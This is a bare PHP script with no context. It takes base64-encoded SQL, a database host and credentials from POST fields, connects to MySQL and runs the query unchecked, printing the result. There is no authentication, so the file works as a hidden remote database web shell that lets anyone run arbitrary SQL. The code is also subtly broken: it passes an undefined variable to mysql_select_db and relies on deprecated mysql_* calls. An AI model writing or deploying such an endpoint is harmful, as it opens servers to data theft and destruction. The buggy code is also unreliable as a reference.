<?php
$sql = base64_decode($_POST['sql']);

$host = base64_decode($_POST['host']);
$user = base64_decode($_POST['user']);
$pass = base64_decode($_POST['pass']);
$db = base64_decode($_POST['db']);

$connect = mysql_connect($host, $user, $pass)  or die("Could not connect: " . mysql_error());

$db_selected = mysql_select_db($db, $link);
if (!$db_selected) {
    die ('Не удалось выбрать базу: ' . mysql_error());
}

$req = mysql_query($sql, $connect);

print_r($req);
mysql_close($connect);
?>
